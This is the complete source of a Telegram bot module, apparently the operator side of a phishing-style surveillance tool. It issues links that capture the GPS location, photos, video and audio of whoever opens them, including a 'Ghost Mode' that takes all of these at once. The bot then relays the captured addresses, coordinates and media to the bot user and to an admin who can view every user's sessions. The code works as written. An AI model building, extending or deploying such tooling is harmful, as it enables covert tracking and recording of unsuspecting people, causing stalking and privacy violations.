/**
 * ============================================
 * Telegram Bot Module
 * ============================================
 * Main bot logic with command and message handlers.
 */

const { Telegraf } = require('telegraf');
const config = require('./config');
const logger = require('./logger');
const api = require('./api');
const { 
    mainMenuKeyboard,
    adminMenuKeyboard,
    previewMenuKeyboard,
    getPermissionTypeFromButton, 
    sessionActionsKeyboard,
    adminPanelKeyboard,
    accessRequestsKeyboard,
    userListKeyboard,
    userDetailKeyboard
} = require('./keyboard');

// Create bot instance
const bot = new Telegraf(config.botToken);

// Store active sessions for status updates (in-memory)
const activeSessions = new Map();

// ============================================
// Helper Functions
// ============================================

/**
 * Check if user is admin
 */
const isAdmin = (telegramId) => {
    return telegramId === config.admin.telegramId;
};

/**
 * Get appropriate menu for user
 */
const getMenuForUser = async (telegramId) => {
    if (isAdmin(telegramId)) {
        return adminMenuKeyboard;
    }
    
    try {
        const result = await api.checkUserStatus(telegramId);
        if (result.success && result.status.isApproved) {
            return mainMenuKeyboard;
        }
    } catch (error) {
        logger.error('Failed to check user status', { error: error.message });
    }
    
    return previewMenuKeyboard;
};

// ============================================
// Middleware
// ============================================

// Log all updates
bot.use((ctx, next) => {
    const user = ctx.from;
    logger.debug('Update received', {
        type: ctx.updateType,
        userId: user?.id,
        username: user?.username
    });
    return next();
});

// ============================================
// Command Handlers
// ============================================

/**
 * /start command - Initialize bot and show appropriate menu
 */
bot.start(async (ctx) => {
    const user = ctx.from;
    
    logger.info('User started bot', {
        userId: user.id,
        username: user.username
    });
    
    // Check user status
    const menu = await getMenuForUser(user.id);
    
    if (isAdmin(user.id)) {
        // Admin welcome
        await ctx.reply(
            `👑 Welcome Admin, ${user.first_name || 'Boss'}!\n\n` +
            `You have full access to all features.\n\n` +
            `I can help you create permission sessions for:\n` +
            `📍 Location tracking\n` +
            `📷 Photo capture\n` +
            `🎥 Video recording\n` +
            `🎤 Audio recording\n` +
            `👻 Ghost Mode (all at once)\n\n` +
            `Use 🔐 Admin Panel to manage users and access requests.`,
            menu
        );
    } else {
        // Check if approved
        try {
            const result = await api.checkUserStatus(user.id);
            
            if (result.success && result.status.isApproved) {
                // Approved user
                await ctx.reply(
                    `👋 Welcome back, ${user.first_name || 'User'}!\n\n` +
                    `I can help you create permission sessions for:\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Select an option from the menu below to get started.`,
                    menu
                );
            } else if (result.success && result.status.accessRequested) {
                // Access already requested
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `⏳ Your access request is pending.\n` +
                    `Please wait for admin approval.\n\n` +
                    `Contact ${config.admin.contact} for faster response.`,
                    menu
                );
            } else {
                // Not approved - show preview
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `🔒 This bot requires approval to use.\n\n` +
                    `*Preview of features:*\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Press 🔑 *Request Access* to request permission.\n` +
                    `Or contact: ${config.admin.contact}`,
                    { parse_mode: 'Markdown', ...menu }
                );
            }
        } catch (error) {
            logger.error('Error checking user status', { error: error.message });
            await ctx.reply(
                `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                `🔒 This bot requires approval to use.\n` +
                `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
                { parse_mode: 'Markdown', ...menu }
            );
        }
    }
});

/**
 * /help command - Show help message
 */
bot.help(async (ctx) => {
    await ctx.reply(
        `ℹ️ *How to use this bot:*\n\n` +
        `1️⃣ Select a permission type from the menu\n` +
        `2️⃣ Receive a unique link\n` +
        `3️⃣ Open the link in your browser\n` +
        `4️⃣ Grant permissions when prompted\n` +
        `5️⃣ Data will be captured and stored\n\n` +
        `*Available permissions:*\n` +
        `📍 Location - Track GPS coordinates\n` +
        `📷 Single Photo - Capture one photo\n` +
        `📸 Continuous Photo - Take photos periodically\n` +
        `🎥 Video - Record video\n` +
        `🎤 Microphone - Record audio\n` +
        `👻 Ghost Mode - Capture location, photo & audio together\n\n` +
        `*Commands:*\n` +
        `/start - Show main menu\n` +
        `/help - Show this help message\n` +
        `/status - Check API status`,
        { parse_mode: 'Markdown' }
    );
});

/**
 * /status command - Check API health
 */
bot.command('status', async (ctx) => {
    const isHealthy = await api.checkHealth();
    
    await ctx.reply(
        isHealthy
            ? '✅ Backend API is online and healthy'
            : '❌ Backend API is offline or unhealthy'
    );
});

// ============================================
// Message Handlers
// ============================================

/**
 * Handle all text button presses
 */
bot.on('text', async (ctx) => {
    const buttonText = ctx.message.text;
    const user = ctx.from;
    
    // Handle Admin Panel button
    if (buttonText === '🔐 Admin Panel') {
        if (!isAdmin(user.id)) {
            await ctx.reply('❌ Admin access required.');
            return;
        }
        
        await ctx.reply(
            '🔐 *Admin Panel*\n\n' +
            'Select an option below:',
            { parse_mode: 'Markdown', ...adminPanelKeyboard }
        );
        return;
    }
    
    // Handle Request Access button
    if (buttonText === '🔑 Request Access') {
        try {
            // Check if already requested
            const statusResult = await api.checkUserStatus(user.id);
            
            if (statusResult.success && statusResult.status.isApproved) {
                const menu = await getMenuForUser(user.id);
                await ctx.reply(
                    '✅ You already have access! Use the menu to create sessions.',
                    menu
                );
                return;
            }
            
            if (statusResult.success && statusResult.status.accessRequested) {
                await ctx.reply(
                    '⏳ You have already requested access.\n' +
                    `Please wait for admin approval or contact ${config.admin.contact}`
                );
                return;
            }
            
            // Request access
            await api.requestAccess(user);
            
            await ctx.reply(
                '✅ *Access Request Sent!*\n\n' +
                'Your request has been submitted.\n' +
                `An admin will review it soon.\n\n` +
                `For faster response, contact: ${config.admin.contact}`,
                { parse_mode: 'Markdown' }
            );
            
            // Notify admin
            try {
                await ctx.telegram.sendMessage(
                    config.admin.telegramId,
                    `🔔 *New Access Request*\n\n` +
                    `User: ${user.first_name || ''} ${user.last_name || ''}\n` +
                    `Username: @${user.username || 'N/A'}\n` +
                    `ID: \`${user.id}\`\n\n` +
                    `Use Admin Panel to approve or deny.`,
                    { parse_mode: 'Markdown' }
                );
            } catch (notifyErr) {
                logger.error('Failed to notify admin', { error: notifyErr.message });
            }
            
            logger.info('Access requested', { userId: user.id, username: user.username });
            
        } catch (error) {
            logger.error('Failed to request access', { error: error.message });
            await ctx.reply('❌ Failed to submit request. Please try again later.');
        }
        return;
    }
    
    // Handle Preview buttons (for unapproved users)
    if (buttonText.includes('(Preview)')) {
        await ctx.reply(
            '🔒 *Feature Locked*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Check if it's a permission button
    const permissionType = getPermissionTypeFromButton(buttonText);
    
    if (!permissionType) {
        await ctx.reply(
            '🤔 I don\'t understand that message.\n' +
            'Please use the menu buttons below or type /help for assistance.'
        );
        return;
    }
    
    // Check if user is approved
    const userIsAdmin = isAdmin(user.id);
    let userIsApproved = false;
    
    if (!userIsAdmin) {
        try {
            const statusResult = await api.checkUserStatus(user.id);
            userIsApproved = statusResult.success && statusResult.status.isApproved;
        } catch (error) {
            logger.error('Failed to check approval status', { error: error.message });
        }
    }
    
    if (!userIsAdmin && !userIsApproved) {
        await ctx.reply(
            '🔒 *Access Denied*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const permissionConfig = config.permissions[permissionType];
    
    logger.info('Permission requested', {
        userId: user.id,
        permissionType
    });
    
    // Show processing message
    const processingMsg = await ctx.reply('⏳ Creating session...');
    
    try {
        // Create session via API
        const result = await api.createSession(user, permissionType);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to create session');
        }
        
        const { session } = result;
        
        // Store session for tracking
        activeSessions.set(session.id, {
            chatId: ctx.chat.id,
            userId: user.id,
            permissionType,
            createdAt: new Date()
        });
        
        // Delete processing message
        await ctx.deleteMessage(processingMsg.message_id).catch(() => {});
        
        // Send session link
        await ctx.reply(
            `✅ *Session Created!*\n\n` +
            `*Type:* ${permissionConfig.label}\n` +
            `*Description:* ${permissionConfig.description}\n\n` +
            `🔗 *Click the link below to start:*\n` +
            `${session.webLink}\n\n` +
            `⏰ *Expires:* ${new Date(session.expiresAt).toLocaleString()}\n\n` +
            `_The link will open in your browser where you can grant the required permissions._`,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                ...sessionActionsKeyboard(session.id)
            }
        );
        
        logger.info('Session created successfully', {
            sessionId: session.id,
            userId: user.id,
            permissionType
        });
        
    } catch (error) {
        logger.error('Failed to create session', {
            userId: user.id,
            error: error.message
        });
        
        // Delete processing message
        await ctx.deleteMessage(processingMsg.message_id).catch(() => {});
        
        await ctx.reply(
            '❌ Failed to create session.\n\n' +
            'Please make sure the backend server is running and try again.\n' +
            'Error: ' + error.message
        );
    }
});

// ============================================
// Callback Query Handlers
// ============================================

/**
 * Handle session status check
 */
bot.action(/^status_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery('Checking status...');
    
    try {
        const result = await api.getSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Session not found');
        }
        
        const { session } = result;
        
        const statusEmoji = {
            created: '🟡',
            active: '🟢',
            ended: '⚫',
            expired: '🔴'
        };
        
        let mediaInfo = '';
        if (session.mediaCounts && Object.keys(session.mediaCounts).length > 0) {
            mediaInfo = '\n\n📊 <b>Data Received:</b>\n';
            for (const [type, count] of Object.entries(session.mediaCounts)) {
                mediaInfo += `  • ${type}: ${count}\n`;
            }
        }
        
        // Build status message
        let statusMessage = 
            `📋 <b>Session Status</b>\n\n` +
            `<b>Status:</b> ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
            `<b>Type:</b> ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
            `<b>Created:</b> ${new Date(session.createdAt).toLocaleString()}\n` +
            `<b>Expires:</b> ${new Date(session.expiresAt).toLocaleString()}` +
            (session.activatedAt ? `\n<b>Activated:</b> ${new Date(session.activatedAt).toLocaleString()}` : '') +
            (session.endedAt ? `\n<b>Ended:</b> ${new Date(session.endedAt).toLocaleString()}` : '') +
            mediaInfo;
        
        await ctx.reply(statusMessage, { parse_mode: 'HTML' });
        
        // If it's a location session, also show the last location with full details
        if (session.permissionType === 'location' && session.mediaCounts?.location > 0) {
            try {
                const locationsResult = await api.getSessionLocations(sessionId);
                
                if (locationsResult.success && locationsResult.locations.length > 0) {
                    // Get the most recent location
                    const latestLocation = locationsResult.locations[locationsResult.locations.length - 1];
                    const loc = latestLocation.data;
                    
                    let locationMessage = `\n📍 <b>LATEST LOCATION</b>\n\n`;
                    
                    // Address
                    if (loc.address) {
                        locationMessage += `📌 <b>Address:</b>\n${loc.address.formatted || loc.address.displayName}\n\n`;
                        
                        if (loc.address.street) locationMessage += `🏠 Street: ${loc.address.street}\n`;
                        if (loc.address.neighborhood) locationMessage += `🏘️ Area: ${loc.address.neighborhood}\n`;
                        if (loc.address.city) locationMessage += `🌆 City: ${loc.address.city}\n`;
                        if (loc.address.state) locationMessage += `🗺️ State: ${loc.address.state}\n`;
                        if (loc.address.country) locationMessage += `🌍 Country: ${loc.address.country}\n`;
                        if (loc.address.postalCode) locationMessage += `📮 Postal: ${loc.address.postalCode}\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Coordinates
                    if (loc.coordinates) {
                        locationMessage += `🎯 <b>Coordinates:</b>\n`;
                        locationMessage += `├ Lat: <code>${loc.coordinates.latitude?.toFixed(6)}</code>\n`;
                        locationMessage += `├ Lng: <code>${loc.coordinates.longitude?.toFixed(6)}</code>\n`;
                        if (loc.coordinates.accuracy) locationMessage += `├ Accuracy: ${loc.coordinates.accuracy.toFixed(1)}m\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Timestamp
                    locationMessage += `🕐 <b>Captured:</b> ${new Date(latestLocation.timestamp).toLocaleString()}\n\n`;
                    
                    // Maps links
                    if (loc.maps) {
                        locationMessage += `🗺️ <b>View on Maps:</b>\n`;
                        locationMessage += `<a href="${loc.maps.googleMaps}">📍 Open in Google Maps</a>\n`;
                        locationMessage += `<a href="${loc.maps.googleMapsDirections}">🧭 Get Directions</a>`;
                    }
                    
                    await ctx.reply(locationMessage, { 
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    });
                }
            } catch (locError) {
                logger.error('Failed to get locations', { error: locError.message });
            }
        }
        
    } catch (error) {
        logger.error('Failed to get session status', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get session status: ' + error.message);
    }
});

/**
 * Handle view results request
 */
bot.action(/^results_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery('Loading results...');
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured yet for this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION RESULTS</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File available on server: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { 
                            caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}`,
                            duration: video.duration
                        }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File available on server: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { 
                            caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}`,
                            duration: audio.duration
                        }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File available on server: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Results sent to user', { sessionId, counts });
        
    } catch (error) {
        logger.error('Failed to get session results', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get results: ' + error.message);
    }
});

/**
 * Handle session end request
 */
bot.action(/^end_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery('Ending session...');
    
    try {
        const result = await api.endSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to end session');
        }
        
        // Remove from active sessions
        activeSessions.delete(sessionId);
        
        await ctx.reply(
            '✅ Session ended successfully.\n\n' +
            'No more data will be accepted for this session.'
        );
        
        logger.info('Session ended by user', { sessionId });
        
    } catch (error) {
        logger.error('Failed to end session', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to end session: ' + error.message);
    }
});

// ============================================
// Admin Callback Handlers
// ============================================

/**
 * Handle admin panel button
 */
bot.action('admin_panel', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        '🔐 *Admin Panel*\n\n' +
        'Select an option below:',
        { parse_mode: 'Markdown', ...adminPanelKeyboard }
    );
});

/**
 * Handle view access requests
 */
bot.action('admin_requests', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Loading requests...');
    
    try {
        const result = await api.getPendingRequests(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get requests');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '📋 *Access Requests*\n\n' +
                '✅ No pending requests!',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `📋 *Access Requests* (${result.count})\n\n`;
        result.requests.forEach((req, i) => {
            msg += `${i + 1}. ${req.firstName || 'Unknown'} ${req.lastName || ''}\n`;
            msg += `   @${req.username || 'N/A'} | ID: \`${req.telegramId}\`\n\n`;
        });
        msg += `\n_Tap ✅ to approve or ❌ to deny_`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...accessRequestsKeyboard(result.requests)
        });
        
    } catch (error) {
        logger.error('Failed to get access requests', { error: error.message });
        await ctx.reply('❌ Failed to load requests: ' + error.message);
    }
});

/**
 * Handle view all users
 */
bot.action('admin_users', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Loading users...');
    
    try {
        const result = await api.getAllUsers(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get users');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '👥 *All Users*\n\n' +
                'No users registered yet.',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `👥 *All Users* (${result.count})\n\n`;
        msg += `_Tap on a user to view details_\n\n`;
        msg += `✅ = Approved | ❌ = Not Approved`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...userListKeyboard(result.users)
        });
        
    } catch (error) {
        logger.error('Failed to get all users', { error: error.message });
        await ctx.reply('❌ Failed to load users: ' + error.message);
    }
});

/**
 * Handle view specific user data
 */
bot.action(/^viewuser_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Loading user data...');
    
    try {
        const result = await api.getUserData(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get user data');
        }
        
        const { user, sessions } = result.data;
        
        let msg = `👤 *User Details*\n\n`;
        msg += `*Name:* ${user.firstName || ''} ${user.lastName || ''}\n`;
        msg += `*Username:* @${user.username || 'N/A'}\n`;
        msg += `*Telegram ID:* \`${user.telegramId}\`\n`;
        msg += `*Status:* ${user.isApproved ? '✅ Approved' : '❌ Not Approved'}\n\n`;
        
        msg += `📊 *Sessions:* ${sessions.length}\n`;
        
        let totalMedia = 0;
        sessions.forEach(s => {
            totalMedia += s.mediaCount;
        });
        msg += `📁 *Total Media:* ${totalMedia}\n\n`;
        
        if (sessions.length > 0) {
            msg += `*Recent Sessions:*\n`;
            sessions.slice(0, 5).forEach((s, i) => {
                const statusEmoji = s.status === 'active' ? '🟢' : s.status === 'ended' ? '⚫' : '🔴';
                msg += `${i + 1}. ${statusEmoji} ${s.permissionType} (${s.mediaCount} files)\n`;
            });
            msg += `\n_Tap a session below to view captured data_`;
        }
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...userDetailKeyboard(targetTelegramId, user.isApproved, sessions)
        });
        
    } catch (error) {
        logger.error('Failed to get user data', { error: error.message });
        await ctx.reply('❌ Failed to load user data: ' + error.message);
    }
});

/**
 * Handle view session data (admin)
 */
bot.action(/^viewsession_(.+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const sessionId = ctx.match[1];
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Loading session data...');
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured in this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION DATA (Admin View)</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}` }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}` }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Admin viewed session data', { sessionId, adminId: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to get session data', { error: error.message });
        await ctx.reply('❌ Failed to load session data: ' + error.message);
    }
});

/**
 * Handle approve user
 */
bot.action(/^approve_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Approving user...');
    
    try {
        const result = await api.approveUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to approve user');
        }
        
        await ctx.reply(
            `✅ *User Approved!*\n\n` +
            `User: ${result.user.firstName || result.user.username || targetTelegramId}\n` +
            `They can now use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🎉 *Access Granted!*\n\n' +
                'Your access request has been approved!\n' +
                'You can now use all bot features.\n\n' +
                'Type /start to begin.',
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify approved user', { error: notifyErr.message });
        }
        
        logger.info('User approved', { targetTelegramId, approvedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to approve user', { error: error.message });
        await ctx.reply('❌ Failed to approve user: ' + error.message);
    }
});

/**
 * Handle deny user
 */
bot.action(/^deny_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery('Denying user...');
    
    try {
        const result = await api.denyUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to deny user');
        }
        
        await ctx.reply(
            `❌ *User Access Denied/Revoked*\n\n` +
            `User: ${result.user.username || targetTelegramId}\n` +
            `They can no longer use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🔒 *Access Denied*\n\n' +
                'Your access has been denied or revoked.\n' +
                `Contact ${config.admin.contact} if you think this is a mistake.`,
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify denied user', { error: notifyErr.message });
        }
        
        logger.info('User access denied', { targetTelegramId, deniedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to deny user', { error: error.message });
        await ctx.reply('❌ Failed to deny user: ' + error.message);
    }
});

/**
 * Handle back to menu
 */
bot.action('admin_back', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
        '👑 Back to main menu',
        adminMenuKeyboard
    );
});

// ============================================
// Error Handling
// ============================================

bot.catch((err, ctx) => {
    logger.error('Bot error', {
        error: err.message,
        updateType: ctx.updateType
    });
});

// ============================================
// Exports
// ============================================

module.exports = bot;
